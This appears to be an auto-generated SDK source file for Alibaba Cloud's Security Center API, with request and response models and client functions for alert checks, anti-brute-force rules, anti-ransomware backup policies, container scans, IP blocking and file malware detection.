model CheckSecurityEventIdRequest {
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of alert events. You can specify up to 100 IDs. If you do not specify this parameter, the value of the response parameter **Data** is **false**. The value false indicates that no alert events are generated on the server.

>  You can call the [DescribeAlarmEventList](~~DescribeAlarmEventList~~) operation to query the IDs of alert events.', example='["1234567","98765432"]'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='96ad2473-bc60-45ba-ad1c-932e2866****'),
}

model CheckSecurityEventIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the alert events are generated on the server. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E67FE'),
}

model CheckSecurityEventIdResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckSecurityEventIdResponseBody(name='body'),
}

async function checkSecurityEventIdWithOptions(request: CheckSecurityEventIdRequest, runtime: Util.RuntimeOptions): CheckSecurityEventIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckSecurityEventId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkSecurityEventId(request: CheckSecurityEventIdRequest): CheckSecurityEventIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkSecurityEventIdWithOptions(request, runtime);
}

model CheckUserHasEcsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model CheckUserHasEcsResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  data?: boolean(name='Data', description='Indicates whether ECS instances exist. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  success?: boolean(name='Success', description='The status of the request. Valid values:

*   **true**: The request is successful.
*   **false**: The request fails.', example='true'),
}

model CheckUserHasEcsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckUserHasEcsResponseBody(name='body'),
}

async function checkUserHasEcsWithOptions(request: CheckUserHasEcsRequest, runtime: Util.RuntimeOptions): CheckUserHasEcsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckUserHasEcs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkUserHasEcs(request: CheckUserHasEcsRequest): CheckUserHasEcsResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkUserHasEcsWithOptions(request, runtime);
}

model ConfirmVirusEventsRequest {
  operationAll?: int32(name='OperationAll', example='0'),
  operationCode?: string(name='OperationCode', example='default'),
  operationRange?: string(name='OperationRange', example='[{\\"type\\":\\"machine\\",\\"list\\":[\\"3aedba3d-bd4d-4dfb-bb0d-xxxxxxxxxxxx\\"]}]'),
}

model ConfirmVirusEventsResponseBody = {
  requestId?: string(name='RequestId', example='5DFD6277-CC36-57F7-ACE6-F5952XXXXXXXX'),
  result?: boolean(name='Result', example='true'),
}

model ConfirmVirusEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ConfirmVirusEventsResponseBody(name='body'),
}

async function confirmVirusEventsWithOptions(request: ConfirmVirusEventsRequest, runtime: Util.RuntimeOptions): ConfirmVirusEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operationAll)) {
    query['OperationAll'] = request.operationAll;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationRange)) {
    query['OperationRange'] = request.operationRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ConfirmVirusEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function confirmVirusEvents(request: ConfirmVirusEventsRequest): ConfirmVirusEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return confirmVirusEventsWithOptions(request, runtime);
}

model CreateAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', description='Specifies whether to set the defense rule as the default rule. Valid values:

*   **true**: yes
*   **false**: no

>  If no defense rule is created for a server, the default rule is applied to the server.', example='true'),
  failCount?: int32(name='FailCount', description='The maximum number of failed logon attempts from an account. Valid values: 2, 3, 4, 5, 10, 50, 80, and 100.', example='2'),
  forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes. Valid values:

*   **5**: 5 minutes
*   **15**: 15 minutes
*   **30**: 30 minutes
*   **60**: 1 hour
*   **120**: 2 hours
*   **360**: 6 hours
*   **720**: 12 hours
*   **1440**: 24 hours
*   **10080**: 7 days
*   **52560000**: permanent', example='5'),
  name?: string(name='Name', description='The name of the defense rule.', example='TestAntiBruteForceRule'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  span?: int32(name='Span', description='The maximum period of time during which failed logon attempts from an account can occur. Unit: minutes. Valid values:

*   **1**
*   **2**
*   **5**
*   **10**
*   **15**

>  To configure a defense rule, you must specify the Span, FailCount, and ForbiddenTime parameters. If the number of failed logon attempts from an account within the minutes specified by Span exceeds the value specified by FailCount, the account cannot be used for logons within the minutes specified by ForbiddenTime.', example='1'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which you want to apply the defense rule.'),
}

model CreateAntiBruteForceRuleResponseBody = {
  createAntiBruteForceRule?: {
    ruleId?: long(name='RuleId', description='The ID of the defense rule.', example='65778'),
  }(name='CreateAntiBruteForceRule', description='The information about the defense rule.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model CreateAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateAntiBruteForceRuleResponseBody(name='body'),
}

async function createAntiBruteForceRuleWithOptions(request: CreateAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): CreateAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRule)) {
    query['DefaultRule'] = request.defaultRule;
  }
  if (!Util.isUnset(request.failCount)) {
    query['FailCount'] = request.failCount;
  }
  if (!Util.isUnset(request.forbiddenTime)) {
    query['ForbiddenTime'] = request.forbiddenTime;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.span)) {
    query['Span'] = request.span;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createAntiBruteForceRule(request: CreateAntiBruteForceRuleRequest): CreateAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createAntiBruteForceRuleWithOptions(request, runtime);
}

model CreateBackupPolicyRequest {
  name?: string(name='Name', description='The name of the anti-ransomware policy.', example='ServerBackUpPolicy01'),
  policy?: map[string]any(name='Policy', description='*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that you want to protect. If you want to protect the files in all formats, set this field to \\[].

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to \\[].

*   **ExcludeSystemPath**: specifies whether to exclude a specific directory from the anti-ransomware policy. If you want to exclude a directory, set this field to **true**. If you do not want to exclude a directory, leave this field empty.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. If you do not want to exclude a directory, set this field to \\[].

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: specifies whether to enable the VSS feature. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='"{"IsDefault":1,"Include":[],"Source":[],"Schedule":"I|1648061040|PT24H","Retention":7,"SpeedLimiter":"","ExcludeSystemPath":true,"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows","Python27","Program Files (x86)","Program Files","Boot","$RECYCLE.BIN","System Volume Information","Users\\Administrator\\NTUSER.DAT*","ProgramData","pagefile.sys","Users\\Default\\NTUSER.DAT*","Users\\Administrator\\ntuser.*"],"UseVss":true}"'),
  policyRegionId?: string(name='PolicyRegionId', description='The region ID of the server that is not deployed on Alibaba Cloud.

>  We recommend that you specify the ID of the supported region that is the nearest to the location of the server. You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the supported regions of the anti-ransomware feature.', example='ch-hangzhou'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers that you want to protect.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model CreateBackupPolicyShrinkRequest {
  name?: string(name='Name', description='The name of the anti-ransomware policy.', example='ServerBackUpPolicy01'),
  policyShrink?: string(name='Policy', description='*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that you want to protect. If you want to protect the files in all formats, set this field to \\[].

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to \\[].

*   **ExcludeSystemPath**: specifies whether to exclude a specific directory from the anti-ransomware policy. If you want to exclude a directory, set this field to **true**. If you do not want to exclude a directory, leave this field empty.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. If you do not want to exclude a directory, set this field to \\[].

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: specifies whether to enable the VSS feature. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='"{"IsDefault":1,"Include":[],"Source":[],"Schedule":"I|1648061040|PT24H","Retention":7,"SpeedLimiter":"","ExcludeSystemPath":true,"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows","Python27","Program Files (x86)","Program Files","Boot","$RECYCLE.BIN","System Volume Information","Users\\Administrator\\NTUSER.DAT*","ProgramData","pagefile.sys","Users\\Default\\NTUSER.DAT*","Users\\Administrator\\ntuser.*"],"UseVss":true}"'),
  policyRegionId?: string(name='PolicyRegionId', description='The region ID of the server that is not deployed on Alibaba Cloud.

>  We recommend that you specify the ID of the supported region that is the nearest to the location of the server. You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the supported regions of the anti-ransomware feature.', example='ch-hangzhou'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers that you want to protect.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model CreateBackupPolicyResponseBody = {
  backupPolicy?: {
    id?: string(name='Id', description='The ID of the anti-ransomware policy.', example='1301575'),
    status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**
*   **disabled**

>  After you create an anti-ransomware policy, the policy is enabled by default.', example='enabled'),
  }(name='BackupPolicy', description='The information about the anti-ransomware policy.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model CreateBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateBackupPolicyResponseBody(name='body'),
}

async function createBackupPolicyWithOptions(tmpReq: CreateBackupPolicyRequest, runtime: Util.RuntimeOptions): CreateBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new CreateBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.policy)) {
    request.policyShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.policy, 'Policy', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policyShrink)) {
    query['Policy'] = request.policyShrink;
  }
  if (!Util.isUnset(request.policyRegionId)) {
    query['PolicyRegionId'] = request.policyRegionId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createBackupPolicy(request: CreateBackupPolicyRequest): CreateBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createBackupPolicyWithOptions(request, runtime);
}

model CreateContainerScanTaskRequest {
  clusterId?: string(name='ClusterId', example='c22143730ab6e40b09ec7c1c51d4d****'),
  containerIds?: string(name='ContainerIds', example='c927cf190e886696db53cda0efb57145394ccf0bf9f525353fa5c22a26e4****'),
  lang?: string(name='Lang', example='zh'),
}

model CreateContainerScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', example='true'),
    collectTime?: long(name='CollectTime', example='1644286364150'),
    execTime?: long(name='ExecTime', example='1644286364150'),
    finishCount?: int32(name='FinishCount', example='33'),
    progress?: int32(name='Progress', example='100'),
    result?: string(name='Result', example='SUCCESS'),
    status?: string(name='Status', example='SUCCESS'),
    taskId?: string(name='TaskId', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    totalCount?: int32(name='TotalCount', example='62'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model CreateContainerScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateContainerScanTaskResponseBody(name='body'),
}

async function createContainerScanTaskWithOptions(request: CreateContainerScanTaskRequest, runtime: Util.RuntimeOptions): CreateContainerScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerIds)) {
    query['ContainerIds'] = request.containerIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateContainerScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createContainerScanTask(request: CreateContainerScanTaskRequest): CreateContainerScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createContainerScanTaskWithOptions(request, runtime);
}

model CreateCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', example='192.168.xx.xx'),
  bound?: string(name='Bound', example='in'),
  expireTime?: long(name='ExpireTime', example='1859094550000'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuids?: string(name='Uuids', example='71c846d6-5c84-4714-acfc-58265bc3****,5013b5e8-1613-43a8-b4de-651db318****,df53f0ad-b3ba-4fe0-9ec7-f42a2ae2****'),
}

model CreateCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model CreateCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateCustomBlockRecordResponseBody(name='body'),
}

async function createCustomBlockRecordWithOptions(request: CreateCustomBlockRecordRequest, runtime: Util.RuntimeOptions): CreateCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.expireTime)) {
    query['ExpireTime'] = request.expireTime;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createCustomBlockRecord(request: CreateCustomBlockRecordRequest): CreateCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCustomBlockRecordWithOptions(request, runtime);
}

model CreateCycleTaskRequest {
  enable?: int32(name='Enable', example='1'),
  firstDateStr?: long(name='FirstDateStr', example='1650556800000'),
  intervalPeriod?: int32(name='IntervalPeriod', example='7'),
  param?: string(name='Param', example='{
      "targetInfo": [
            {
                  "type": "groupId",
                  "name": "TI HOST",
                  "target": 10597***
            },
            {
                  "type": "groupId",
                  "name": "expense HOST",
                  "target": 10597***
            }
      ]
}'),
  periodUnit?: string(name='PeriodUnit', example='day'),
  source?: string(name='Source', example='console_batch'),
  targetEndTime?: int32(name='TargetEndTime', example='6'),
  targetStartTime?: int32(name='TargetStartTime', example='0'),
  taskName?: string(name='TaskName', example='EMG_VUL_SCHEDULE_SCAN'),
  taskType?: string(name='TaskType', example='VIRUS_VUL_SCHEDULE_SCAN'),
}

model CreateCycleTaskResponseBody = {
  requestId?: string(name='RequestId', example='86CFF42E-E00A-57A3-8656-22291EFB****'),
}

model CreateCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateCycleTaskResponseBody(name='body'),
}

async function createCycleTaskWithOptions(request: CreateCycleTaskRequest, runtime: Util.RuntimeOptions): CreateCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.firstDateStr)) {
    query['FirstDateStr'] = request.firstDateStr;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.targetEndTime)) {
    query['TargetEndTime'] = request.targetEndTime;
  }
  if (!Util.isUnset(request.targetStartTime)) {
    query['TargetStartTime'] = request.targetStartTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createCycleTask(request: CreateCycleTaskRequest): CreateCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCycleTaskWithOptions(request, runtime);
}

model CreateFileDetectRequest {
  hashKey?: string(name='HashKey', description='The identifier of the file. Only MD5 hash values are supported.', example='0a212417e65c26ff133cfff28f6c****'),
  ossKey?: string(name='OssKey', description='The key of the file that is stored in the Object Storage Service (OSS) bucket. You can call the [CreateFileDetectUploadUrl](~~CreateFileDetectUploadUrl~~) operation to query the keys of files.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='115.213.XX.XX'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown files
*   **1**: binary files
*   **2**: webshell files
*   **4**: script files

>  If you do not know the type of the file, set this parameter to 0.', example='0'),
}

model CreateFileDetectResponseBody = {
  hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CreateFileDetectResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileDetectResponseBody(name='body'),
}

/**
  * You can call this operation to push a file to the cloud for detection. Before you call this operation, make sure that the file is uploaded. You can call the CreateFileDetectUploadUrl operation to upload the file.
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateFileDetectResponse
 */
async function createFileDetectWithOptions(request: CreateFileDetectRequest, runtime: Util.RuntimeOptions): CreateFileDetectResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKey)) {
    query['HashKey'] = request.hashKey;
  }
  if (!Util.isUnset(request.ossKey)) {
    query['OssKey'] = request.ossKey;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileDetect',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call this operation to push a file to the cloud for detection. Before you call this operation, make sure that the file is uploaded. You can call the CreateFileDetectUploadUrl operation to upload the file.
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectRequest
  * @return CreateFileDetectResponse
 */
async function createFileDetect(request: CreateFileDetectRequest): CreateFileDetectResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileDetectWithOptions(request, runtime);
}

model CreateFileDetectUploadUrlRequest {
  hashKeyContextList?: [ 
    {
      fileSize?: int32(name='FileSize', description='The size of the file. Unit: bytes.', example='2698557'),
      hashKey?: string(name='HashKey', description='The hash value of the file.', example='30319dd5cee8f894766e479cac170da0'),
    }
  ](name='HashKeyContextList', description='The hash values of files.

>  You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.'),
  hashKeyList?: [ string ](name='HashKeyList', description='The identifier of the file. Only MD5 hash values are supported.

>  You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown files
*   **1**: binary files
*   **2**: webshell files
*   **4**: script files

>  If you do not know the type of the file, set this parameter to **0**.', example='0'),
}

model CreateFileDetectUploadUrlResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  uploadUrlList?: [ 
    {
      code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
      context?: {
        accessId?: string(name='AccessId', description='The AccessKey ID that is used to access the OSS bucket.', example='LTAI4G1mgPbjvGQuiV1X****'),
        ossKey?: string(name='OssKey', description='The key of the file that is used after the file is uploaded to the OSS bucket.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
        policy?: string(name='Policy', description='The policy that poses limits on file upload. For example, the policy limits the size of the file.', example='eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0yM1QxMDo1ODoxMC43NTNaIiwiY29uZGl0aW9ucyI6W1siY29udGVudC1sZW5ndGgtcmFuZ2UiLDAsMjA5NzE1MjBdLFsiZXEiLCIka2V5IiwiMS8yMDIyLzA2LzIzLzE4LzU4LzE2NTU5ODE4OTA3NTM4NTc2MjFkNS1kN2E1LTQ5YzAtOGJjZi0yMTMyY2JiYTdmYzMi****'),
        signature?: string(name='Signature', description='The signature that is used to upload the file.', example='wDhPgVdnY/bkKFYcYFl+4crl****'),
      }(name='Context', description='The signature information.'),
      expire?: string(name='Expire', description='The timestamp when the values of the parameters expire. Unit: milliseconds.', example='1658562101370'),
      fileExist?: boolean(name='FileExist', description='Indicates whether the file exists in the cloud. Valid values:

*   **true**: The file exists in the cloud. You do not need to upload the file.
*   **false**: The file does not exist in the cloud. You must upload the file.', example='false'),
      hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
      internalUrl?: string(name='InternalUrl', description='The internal endpoint of the URL to which the file is uploaded.', example='http://example.com'),
      message?: string(name='Message', description='The error message returned.', example='successful'),
      publicUrl?: string(name='PublicUrl', description='The public endpoint of the URL to which the file is uploaded.', example='http://example.com'),
    }
  ](name='UploadUrlList', description='An array consisting of the parameters that are required to upload a file.'),
}

model CreateFileDetectUploadUrlResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileDetectUploadUrlResponseBody(name='body'),
}

/**
  * You can call the this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
